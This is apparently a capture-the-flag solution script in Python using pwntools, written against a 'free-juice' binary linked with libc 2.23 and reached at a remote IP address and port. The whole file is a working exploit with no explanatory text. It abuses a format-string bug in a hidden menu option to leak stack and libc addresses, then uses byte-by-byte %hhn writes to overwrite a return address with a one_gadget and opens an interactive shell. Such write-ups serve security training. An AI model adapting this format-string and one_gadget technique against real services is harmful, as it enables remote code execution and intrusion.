from pwn import *

exe = ELF("./free-juice_patched", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

NC = "13.229.150.169:34060".split(":")

context.log_level = "warning"

r = remote(NC[0], NC[1])
if args.LOCAL:
    r = process("./free-juice_patched")

one_gadget = [283258, 983972, 987719]

def goto(n):
    r.sendlineafter(b"choice: ", str(n).encode())

def choose_juice(n):
    goto(1)
    r.sendlineafter(b": ", str(n).encode())

def refill_juice(quantity):
    goto(2)
    r.sendlineafter(b": ", str(quantity).encode())

def drink_juice():
    goto(3)

def secret_choice(message):
    goto(1337)
    r.sendlineafter(b"you!\n", message)
    r.recvuntil(b"Current Juice : ")
    return r.recvline(0)

# for i in range(1, 31):
#     choose_juice(1)
#     print(secret_choice(f"%{i}$p".encode()), i)

choose_juice(1)
leaks = secret_choice(b"%1$p.%3$p.%8$p").split(b".")
libc.address = eval(leaks[1]) - 1012672
rip = eval(leaks[0]) + 10184


print(hex(rip))
print(hex(libc.address))

rop = p64(libc.address + one_gadget[2])

for i in range(len(rop)):
    if rop[i]:
        message = f"%{rop[i]}c%9$hhn".encode()
    else:
        message = b"%9$hhn"
    message = message.ljust(24, b'a')
    message += p64(rip + i)
    choose_juice(1)
    secret_choice(message)
    
goto(4)

r.interactive()